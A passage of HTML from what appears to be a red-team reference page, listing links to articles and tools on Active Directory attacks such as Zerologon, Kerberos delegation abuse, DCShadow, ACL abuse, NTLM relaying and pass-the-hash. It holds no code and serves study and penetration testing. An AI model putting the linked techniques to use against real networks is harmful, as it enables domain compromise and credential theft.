Domain SQL Servers using PowerUpSQL</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1aSU93X3hmcWtLTQ==\">Sensitive Data Discovery in Email with MailSniper</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZm9ydHlub3J0aHNlY3VyaXR5LmNvbS9yZW1vdGVseS1zZWFyY2gv\">Remotely Searching for Sensitive Files</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3BlbmV0ZXN0aW5nL2ktaHVudC1zeXNhZG1pbnMv\">I Hunt Sysadmins - harmj0y</span></li>\n</ul>\n<h3 id=\"user-hunting\"><a class=\"anchor\" href=\"#user-hunting\">#</a> User Hunting</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3Jvd2RzdHJpa2UuY29tL2Jsb2cvaGlkZGVuLWFkbWluaXN0cmF0aXZlLWFjY291bnRzLWJsb29kaG91bmQtdG8tdGhlLXJlc2N1ZS8=\">Hidden Administrative Accounts: BloodHound to the Rescue</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yNTM1\">Active Directory Recon Without Admin Rights</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zNzE5\">Gathering AD Data with the Active Directory PowerShell Module</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxOC8xMC9kb21haW4tZW51bWVyYXRpb24tZnJvbS1Qb3dlclNoZWxsLUNMTS5odG1s\">Using ActiveDirectory module for Domain Enumeration from PowerShell Constrained Language Mode</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05ldFNQSS9Qb3dlclVwU1FML3dpa2kvQWN0aXZlLURpcmVjdG9yeS1SZWNvbi1GdW5jdGlvbnM=\">PowerUpSQL Active Directory Recon Functions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2l4ZHViLm5ldC8/cD01OTE=\">Derivative Local Admin</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZHVtcGluZy1hY3RpdmUtZGlyZWN0b3J5LWRvbWFpbi1pbmZvLXdpdGgtcG93ZXJ1cHNxbC8=\">Dumping Active Directory Domain Info – with PowerUpSQL!</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL2xvY2FsLWdyb3VwLWVudW1lcmF0aW9uLw==\">Local Group Enumeration</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9sb2NhbC1hZG1pbi1tYXBwaW5nLWJsb29kaG91bmQ=\">Attack Mapping With Bloodhound</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxOC8wNS8yOC9zaXR1YXRpb25hbC1hd2FyZW5lc3Mv\">Situational Awareness</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamF2ZWxpbi1uZXR3b3Jrcy5jb20vc3RhdGljLzVmY2M2ZTg0LnBkZg==\">Commands for Domain Network Compromise</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9hY3RpdmVkaXJlY3RvcnkvYS1wZW50ZXN0ZXJzLWd1aWRlLXRvLWdyb3VwLXNjb3Bpbmcv\">A Pentester’s Guide to Group Scoping</span></li>\n</ul>\n<h3 id=\"laps\"><a class=\"anchor\" href=\"#laps\">#</a> LAPS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zMTY0\">Microsoft LAPS Security &amp; Active Directory LAPS Configuration Recon</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9wb3dlcnNoZWxsL3J1bm5pbmctbGFwcy13aXRoLXBvd2Vydmlldy8=\">Running LAPS with PowerView</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lL3RhZ3MvbGFwcy8=\">RastaMouse LAPS Part 1 &amp; 2</span></li>\n</ul>\n<h3 id=\"applocker\"><a class=\"anchor\" href=\"#applocker\">#</a> AppLocker</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTgvMDkvZW51bWVyYXRpbmctYXBwbG9ja2VyLWNvbmZpZy8=\">Enumerating AppLocker Config</span></li>\n</ul>\n<h3 id=\"azure\"><a class=\"anchor\" href=\"#azure\">#</a> Azure</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvRGlya2phbk1vbGxlbWEvaW0taW4teW91ci1jbG91ZC1yZWFkaW5nLWV2ZXJ5b25lcy1lbWFpbC1oYWNraW5nLWF6dXJlLWFkLXZpYS1hY3RpdmUtZGlyZWN0b3J5\">I'm in your cloud... reading everyone's email. Hacking Azure AD via Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vdXRpaWx6aW5nLWF6dXJlLWZvci1yZWQtdGVhbS1lbmdhZ2VtZW50cy8=\">Utilizing Azure Services for Red Team Engagements</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vdHdlZWtmYXdrZXMvYmx1ZS1jbG91ZC1vZi1kZWF0aC1yZWQtdGVhbWluZy1henVyZS0x\">Blue Cloud of Death: Red Teaming Azure</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnhwbnNlYy5jb20vYXp1cmVhZC1jb25uZWN0LWZvci1yZWR0ZWFtLw==\">Azure AD Connect for Red Teamers</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toaWxsc2luZm9zZWMuY29tL3JlZC10ZWFtaW5nLW1pY3Jvc29mdC1wYXJ0LTEtYWN0aXZlLWRpcmVjdG9yeS1sZWFrcy12aWEtYXp1cmUv\">Red Teaming Microsoft: Part 1 – Active Directory Leaks via Azure</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy93cC1jb250ZW50L3VwbG9hZHMvMjAxOS8wOC8yMDE5LUJsYWNrSGF0LVVTLU1ldGNhbGYtTW9yb3djenluc2tpLUF0dGFja2luZ0FuZERlZmVuZGluZ1RoZU1pY3Jvc29mdENsb3VkLnBkZg==\">Attacking &amp; Defending the Microsoft Cloud</span></li>\n</ul>\n<h3 id=\"active-directory-federation-services\"><a class=\"anchor\" href=\"#active-directory-federation-services\">#</a> Active Directory Federation Services</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vVHlMZEFVanczMA==\">118 Attacking ADFS Endpoints with PowerShell Karl Fosaaen</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vdXNpbmctcG93ZXJzaGVsbC1pZGVudGlmeS1mZWRlcmF0ZWQtZG9tYWlucy8=\">Using PowerShell to Identify Federated Domains</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21kc2VjcmVzZWFyY2gvTHluY1NuaXBlcg==\">LyncSniper: A tool for penetration testing Skype for Business and Lync deployments</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvRG91Z2xhc0JpZW5zdG9jay90cm9vcGVycy0xOS1pLWFtLWFkLWZzLWFuZC1zby1jYW4teW91\">Troopers 19 - I am AD FS and So Can You</span></li>\n</ul>\n<hr />\n<h2 id=\"privilege-escalation\"><a class=\"anchor\" href=\"#privilege-escalation\">#</a> Privilege Escalation</h2>\n<h3 id=\"zerologon\"><a class=\"anchor\" href=\"#zerologon\">#</a> Zerologon</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JzbXVkZ2UvWmVyb0xvZ29uLUJPRg==\">Cobalt Strike ZeroLogon-BOF</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RpcmtqYW5tL0NWRS0yMDIwLTE0NzI=\">CVE-2020-1472 POC</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJhLmNvbS9ibG9nL3plcm8tbG9nb24=\">Zerologon: instantly become domain admin by subverting Netlogon cryptography (CVE-2020-1472)</span></li>\n</ul>\n<h3 id=\"passwords-in-sysvol-group-policy-preferences\"><a class=\"anchor\" href=\"#passwords-in-sysvol-group-policy-preferences\">#</a> Passwords in SYSVOL &amp; Group Policy Preferences</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yMjg4\">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJhcGlkNy5jb20vMjAxNi8wNy8yNy9wZW50ZXN0aW5nLWluLXRoZS1yZWFsLXdvcmxkLWdyb3VwLXBvbGljeS1wd25hZ2Uv\">Pentesting in the Real World: Group Policy Pwnage</span></li>\n</ul>\n<h3 id=\"ms14-068-kerberos-vulnerability\"><a class=\"anchor\" href=\"#ms14-068-kerberos-vulnerability\">#</a> MS14-068 Kerberos Vulnerability</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD01MjU=\">MS14-068: Vulnerability in (Active Directory) Kerberos Could Allow Elevation of Privilege</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy9kaWdnaW5nLWludG8tbXMxNC0wNjgtZXhwbG9pdGF0aW9uLWFuZC1kZWZlbmNlLw==\">Digging into MS14-068, Exploitation and Defence</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJ1c3RlZHNlYy5jb20vMjAxNC8xMi9tczE0LTA2OC1mdWxsLWNvbXByb21pc2Utc3RlcC1zdGVwLw==\">From MS14-068 to Full Compromise – Step by Step</span></li>\n</ul>\n<h3 id=\"dnsadmins\"><a class=\"anchor\" href=\"#dnsadmins\">#</a> DNSAdmins</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxNy8wNS9hYnVzaW5nLWRuc2FkbWlucy1wcml2aWxlZ2UtZm9yLWVzY2FsYXRpb24taW4tYWN0aXZlLWRpcmVjdG9yeS5odG1s\">Abusing DNSAdmins privilege for escalation in Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD00MDY0\">From DNSAdmins to Domain Admin, When DNSAdmins is More than Just DNS Administration</span></li>\n</ul>\n<h3 id=\"kerberos-delegation\"><a class=\"anchor\" href=\"#kerberos-delegation\">#</a> Kerberos Delegation</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGVuYW5pZ2Fuc2xhYnMuaW8vbWVkaWEvQ29uc3RydWN0aW5nJTIwS2VyYmVyb3MlMjBBdHRhY2tzJTIwd2l0aCUyMERlbGVnYXRpb24lMjBQcmltaXRpdmVzLnBkZg==\">Constructing Kerberos Attacks with Delegation Primitives</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cucmVkeG9yYmx1ZS5jb20vMjAxOS8xMi9uby1zaGVsbHMtcmVxdWlyZWQtdXNpbmctaW1wYWNrZXQtdG8uaHRtbA==\">No Shells Required - a Walkthrough on Using Impacket and Kerberos to Delegate Your Way to DA</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vY3ZlLTIwMjAtMTcwNDkta2VyYmVyb3MtYnJvbnplLWJpdC1vdmVydmlldy8=\">CVE-2020-17049: Kerberos Bronze Bit Attack – Overview</span></li>\n</ul>\n<h4 id=\"unconstrained-delegation\"><a class=\"anchor\" href=\"#unconstrained-delegation\">#</a> Unconstrained Delegation</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD00MDU2\">Domain Controller Print Server + Unconstrained Kerberos Delegation = Pwned Active Directory Forest</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNjY3\">Active Directory Security Risk #101: Kerberos Unconstrained Delegation (or How Compromise of a Single Server Can Compromise the Domain)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS91bmNvbnN0cmFpbmVkLWRlbGVnYXRpb24tcGVybWlzc2lvbnMv\">Unconstrained Delegation Permissions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy90cnVzdC15ZWFycy10by1lYXJuLXNlY29uZHMtdG8tYnJlYWsv\">Trust? Years to earn, seconds to break</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2h1bnRpbmctaW4tYWN0aXZlLWRpcmVjdG9yeS11bmNvbnN0cmFpbmVkLWRlbGVnYXRpb24tZm9yZXN0cy10cnVzdHMtNzFmMmIzMzY4OGUx\">Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmljY2FyZG9hbmNhcmFuaS5pdC9leHBsb2l0aW5nLXVuY29uc3RyYWluZWQtZGVsZWdhdGlvbi8=\">Exploiting Unconstrained Delegation</span></li>\n</ul>\n<h4 id=\"constrained-delegation\"><a class=\"anchor\" href=\"#constrained-delegation\">#</a> Constrained Delegation</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL2Fub3RoZXItd29yZC1vbi1kZWxlZ2F0aW9uLw==\">Another Word on Delegation</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL2Zyb20ta2VrZW8tdG8tcnViZXVzLw==\">From Kekeo to Rubeus</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL2FjdGl2ZWRpcmVjdG9yeS9zNHUycHduYWdlLw==\">S4U2Pwnage</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJlYXV0aC5jb20vYmxvZy9rZXJiZXJvcy1kZWxlZ2F0aW9uLXNwbnMtYW5kLW1vcmU=\">Kerberos Delegation, Spns And More...</span></li>\n</ul>\n<h4 id=\"resource-based-constrained-delegation\"><a class=\"anchor\" href=\"#resource-based-constrained-delegation\">#</a> Resource-Based Constrained Delegation</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zaGVuYW5pZ2Fuc2xhYnMuaW8vMjAxOS8wMS8yOC9XYWdnaW5nLXRoZS1Eb2cuaHRtbA==\">Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcmVkLnRlYW0vb2ZmZW5zaXZlLXNlY3VyaXR5LWV4cGVyaW1lbnRzL2FjdGl2ZS1kaXJlY3Rvcnkta2VyYmVyb3MtYWJ1c2UvcmVzb3VyY2UtYmFzZWQtY29uc3RyYWluZWQtZGVsZWdhdGlvbi1hZC1jb21wdXRlci1vYmplY3QtdGFrZS1vdmVyLWFuZC1wcml2aWxnZWQtY29kZS1leGVjdXRpb24=\">Kerberos Resource-based Constrained Delegation: Computer Object Take Over</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9yZXNvdXJjZS1iYXNlZC1jb25zdHJhaW5lZC1kZWxlZ2F0aW9uLWFidXNlLw==\">Resource Based Constrained Delegation</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL2FjdGl2ZWRpcmVjdG9yeS9hLWNhc2Utc3R1ZHktaW4td2FnZ2luZy10aGUtZG9nLWNvbXB1dGVyLXRha2VvdmVyLw==\">A Case Study in Wagging the Dog: Computer Takeover</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1SVWJBREhjQkxLZw==\">BloodHound 2.1's New Computer Takeover Attack</span></li>\n</ul>\n<h3 id=\"insecure-group-policy-object-permission-rights\"><a class=\"anchor\" href=\"#insecure-group-policy-object-permission-rights\">#</a> Insecure Group Policy Object Permission Rights</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL2FidXNpbmctZ3BvLXBlcm1pc3Npb25zLw==\">Abusing GPO Permissions</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxkMC5jb20vP3A9MTc5\">A Red Teamer’s Guide to GPOs and OUs</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Jhc3RhLW1vdXNlL0dQTy1BYnVzZQ==\">File templates for GPO Abuse</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYXN0YW1vdXNlLm1lLzIwMTkvMDEvZ3BvLWFidXNlLXBhcnQtMS8=\">GPO Abuse - Part 1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL213cmxhYnMvU2hhcnBHUE9BYnVzZQ==\">SharpGPOAbuse</span></li>\n</ul>\n<h3 id=\"insecure-acls-permission-rights\"><a class=\"anchor\" href=\"#insecure-acls-permission-rights\">#</a> Insecure ACLs Permission Rights</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9leHBsb2l0aW5nLXdlYWstYWN0aXZlLWRpcmVjdG9yeS1wZXJtaXNzaW9ucy13aXRoLXBvd2Vyc3Bsb2l0Lw==\">Exploiting Weak Active Directory Permissions With Powersploit</span></li>\n<li><a href=\"https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/\">Escalating privileges with ACLs in Active Directory<br />\n</a></li>\n<li><a href=\"http://www.harmj0y.net/blog/redteaming/abusing-active-directory-permissions-with-powerview/\">Abusing Active Directory Permissions with PowerView<br />\n</a></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxkMC5jb20vP3A9MTEy\">BloodHound 1.3 – The ACL Attack Path Update</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0zNjU4\">Scanning for Active Directory Privileges &amp; Privileged Accounts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90ZWNoY29tbXVuaXR5Lm1pY3Jvc29mdC5jb20vdDUvRW50ZXJwcmlzZS1Nb2JpbGl0eS1TZWN1cml0eS9BY3RpdmUtRGlyZWN0b3J5LUFjY2Vzcy1Db250cm9sLUxpc3QtODIxMS1BdHRhY2tzLWFuZC1EZWZlbnNlL2JhLXAvMjUwMzE1\">Active Directory Access Control List – Attacks and Defense</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2xpZGVzaGFyZS5uZXQvRGlya2phbk1vbGxlbWEvYWNscHduLWFjdGl2ZS1kaXJlY3RvcnktYWNsLWV4cGxvaXRhdGlvbi13aXRoLWJsb29kaG91bmQ=\">aclpwn - Active Directory ACL exploitation with BloodHound</span></li>\n</ul>\n<h3 id=\"domain-trusts\"><a class=\"anchor\" href=\"#domain-trusts\">#</a> Domain Trusts</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3JlZHRlYW1pbmcvYS1ndWlkZS10by1hdHRhY2tpbmctZG9tYWluLXRydXN0cy8=\">A Guide to Attacking Domain Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNTg4\">It's All About Trust – Forging Kerberos Trust Tickets to Spoof Access across Active Directory Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaXJramFubS5pby9hY3RpdmUtZGlyZWN0b3J5LWZvcmVzdC10cnVzdHMtcGFydC1vbmUtaG93LWRvZXMtc2lkLWZpbHRlcmluZy13b3Jr\">Active Directory forest trusts part 1 - How does SID filtering work?</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrbWFnLmNvbS9zZWN1cml0eS9hZC1mb3Jlc3Qv\">The Forest Is Under Control. Taking over the entire Active Directory forest</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL25vdC1hLXNlY3VyaXR5LWJvdW5kYXJ5LWJyZWFraW5nLWZvcmVzdC10cnVzdHMtY2QxMjU4Mjk1MThk\">Not A Security Boundary: Breaking Forest Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3JlZHRlYW1pbmcvdGhlLXRydXN0cG9jYWx5cHNlLw==\">The Trustpocalypse</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy9pbHpqdGxvMHZieXUxdTAvQ2FybG9zJTIwR2FyY2lhJTIwLSUyMFJvb3RlZDIwMTklMjAtJTIwUGVudGVzdGluZyUyMEFjdGl2ZSUyMERpcmVjdG9yeSUyMEZvcmVzdHMlMjBwdWJsaWMucGRmP2RsPTA=\">Pentesting Active Directory Forests</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0yODI=\">Security Considerations for Active Directory (AD) Trusts</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9hZHNlY3VyaXR5Lm9yZy8/cD0xNjQw\">Kerberos Golden Tickets are Now More Golden</span></li>\n</ul>\n<h3 id=\"dcshadow\"><a class=\"anchor\" href=\"#dcshadow\">#</a> DCShadow</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9wcml2aWxlZ2UtZXNjYWxhdGlvbi13aXRoLWRjc2hhZG93Lw==\">Privilege Escalation With DCShadow</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxOC8wNC8xNi9kY3NoYWRvdy8=\">DCShadow</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmFsc2lkLmV1L2Rjc2hhZG93LWV4cGxhaW5lZC00NTEwZjUyZmMxOWQ=\">DCShadow explained: A technical deep dive into the latest AD attack technique</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxOC8wNS9kY3NoYWRvdy1zYWNsLmh0bWw=\">DCShadow - Silently turn off Active Directory Auditing</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sYWJvZmFwZW5ldHJhdGlvbnRlc3Rlci5jb20vMjAxOC8wNC9kY3NoYWRvdy5odG1s\">DCShadow - Minimal permissions, Active Directory Deception, Shadowception and more</span></li>\n</ul>\n<h3 id=\"rid\"><a class=\"anchor\" href=\"#rid\">#</a> RID</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9yaWQtaGlqYWNraW5nLXdoZW4tZ3Vlc3RzLWJlY29tZS1hZG1pbnMv\">Rid Hijacking: When Guests Become Admins</span></li>\n</ul>\n<h3 id=\"microsoft-sql-server\"><a class=\"anchor\" href=\"#microsoft-sql-server\">#</a> Microsoft SQL Server</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZ2V0LXNxbC1zZXJ2ZXItc3lzYWRtaW4tcHJpdmlsZWdlcy1sb2NhbC1hZG1pbi1wb3dlcnVwc3FsLw==\">How to get SQL Server Sysadmin Privileges as a Local Admin with PowerUpSQL</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9jb21wcm9taXNlLXdpdGgtcG93ZXJ1cHNxbC1zcWwtYXR0YWNrcy8=\">Compromise With Powerupsql – Sql Attacks</span></li>\n</ul>\n<h3 id=\"red-forest\"><a class=\"anchor\" href=\"#red-forest\">#</a> Red Forest</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZC5lcm53LWluc2lnaHQuZGUvdHJvb3BlcnMvdHIxOC9zbGlkZXMvVFIxOF9BRF9BdHRhY2stYW5kLURlZmVuZC1NaWNyb3NvZnQtRW5oYW5jZWQtU2VjdXJpdHkucGRm\">Attack and defend Microsoft Enhanced Security Administrative</span></li>\n</ul>\n<h3 id=\"exchange\"><a class=\"anchor\" href=\"#exchange\">#</a> Exchange</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dkZWRyb3Vhcy9FeGNoYW5nZS1BRC1Qcml2ZXNj\">Exchange-AD-Privesc</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kaXJramFubS5pby9hYnVzaW5nLWV4Y2hhbmdlLW9uZS1hcGktY2FsbC1hd2F5LWZyb20tZG9tYWluLWFkbWluLw==\">Abusing Exchange: One API call away from Domain Admin</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0Fybm8weC9OdGxtUmVsYXlUb0VXUw==\">NtlmRelayToEWS</span></li>\n</ul>\n<h3 id=\"llmnrnbns\"><a class=\"anchor\" href=\"#llmnrnbns\">#</a> LLMNR/NBNS</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubm90c29zZWN1cmUuY29tL3B3bmluZy13aXRoLXJlc3BvbmRlci1hLXBlbnRlc3RlcnMtZ3VpZGUv\">Pwning with Responder – A Pentester’s Guide</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ieXQzYmwzM2Qzci5naXRodWIuaW8vcHJhY3RpY2FsLWd1aWRlLXRvLW50bG0tcmVsYXlpbmctaW4tMjAxNy1ha2EtZ2V0dGluZy1hLWZvb3Rob2xkLWluLXVuZGVyLTUtbWludXRlcy5odG1s\">Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZm94LWl0LmNvbS9lbi9pbnNpZ2h0cy9ibG9ncy9ibG9nL2luc2lkZS13aW5kb3dzLW5ldHdvcmsv\">Relaying credentials everywhere with ntlmrelayx</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vZXhwbG9pdGluZy1hZGlkbnMv\">Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS</span></li>\n</ul>\n<hr />\n<h2 id=\"lateral-movement\"><a class=\"anchor\" href=\"#lateral-movement\">#</a> Lateral Movement</h2>\n<h3 id=\"microsoft-sql-server-database-links\"><a class=\"anchor\" href=\"#microsoft-sql-server-database-links\">#</a> Microsoft SQL Server Database links</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vaG93LXRvLWhhY2stZGF0YWJhc2UtbGlua3MtaW4tc3FsLXNlcnZlci8=\">SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server!</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm5ldHNwaS5jb20vc3FsLXNlcnZlci1saW5rLWNyYXdsaW5nLXBvd2VydXBzcWwv\">SQL Server Link Crawling with PowerUpSQL</span></li>\n</ul>\n<h3 id=\"pass-the-hash\"><a class=\"anchor\" href=\"#pass-the-hash\">#</a> Pass The Hash</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnN0ZWFsdGhiaXRzLmNvbS9wYXNzaW5nLXRoZS1oYXNoLXdpdGgtbWltaWthdHo=\">Performing Pass-the-hash Attacks With Mimikatz</span></li>\n<li><span class=\"exturl\" 